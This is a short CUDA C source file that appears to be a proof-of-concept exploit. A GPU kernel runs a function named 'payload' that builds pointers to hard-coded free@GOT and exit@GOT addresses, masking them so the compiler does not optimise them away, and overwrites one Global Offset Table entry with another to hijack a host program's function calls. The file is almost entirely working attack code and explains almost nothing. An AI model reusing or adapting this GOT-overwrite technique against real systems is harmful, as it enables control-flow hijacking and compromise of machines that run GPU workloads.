#include <stdio.h>
#include <cuda_runtime.h>

__device__ void payload(unsigned char *a, const float *b, const float *c, int n) {
	// prevent optimizing out & hard-code address of free@GOT
	size_t *d = (size_t*)(((size_t)a & (size_t) b & (size_t) c & 0x0) | 0xa0c560ULL);
	// get exit@GOT
	size_t *e = (size_t*)(((size_t)a & (size_t) b & (size_t) c & 0x0) | 0xa0c280ULL);
	// overwrite exit@GOT
	*d = *e;
}

__global__ void launch_payload(unsigned char *a, const float *b, const float *c, int n) {
	if(blockIdx.x == 0 && threadIdx.x == 0) {
		printf("launch_payload launched\n");
		payload(a, b, c, n);
	}
}


int main(){
	launch_payload<<<1, 1>>>(nullptr, nullptr, nullptr, 0);
	cudaDeviceSynchronize();
	return 0;
}
